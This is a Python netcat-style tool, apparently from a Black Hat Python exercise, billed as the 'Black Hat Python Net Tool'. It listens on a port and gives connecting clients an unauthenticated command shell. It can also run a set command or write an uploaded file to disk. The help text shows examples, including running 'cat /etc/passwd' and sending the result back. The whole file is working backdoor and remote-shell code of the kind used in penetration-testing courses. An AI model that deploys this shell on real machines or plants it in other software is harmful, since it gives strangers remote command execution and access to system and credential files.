import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # execute command in OS and return output this command
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        # connect to target and port
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            # send buffer if we have it
            self.socket.send(self.buffer)
        # we can close on CTRL+C
        try:
            # get the data while they are there
            while True:
                receive_len = 1
                response = ''
                while receive_len:
                    data = self.socket.recv(4096)
                    receive_len = len(data)
                    response += data.decode()
                    if receive_len < 4096:
                        break
                # output the answer, stop to get interactive input and send it
                if response:
                    print(response)
                    buffer = input('$> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        # it`s work until CTRL+C
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        # connect to target and listen no more 5 clients
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        # if need to execute the command, the handle method passes it to the execute
        # function and sends the output back to the socket.
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # if need to download the file, enter a loop to receive data from the listening socket until they stop coming.
        # then write the accumulated contents into the specified file.
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        # if need to create a command shell, we enter the loop, pass the command prompt to the sender and
        # wait for the command line in response. Then execute the command using the execute function and
        # return its output to the sender.
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server KILLED {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Black Hat Python Net Tool',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c                        # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=my_file.txt            # upload file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"      # execute command
        echo 'ACK' | ./netcat.py -t 192.168.1.108 -p 135                # sent text to 135 port
        netcat.py -t 192.168.1.108 -p 5555                              # connecting to target        
        ''')
    )
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen mode')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()
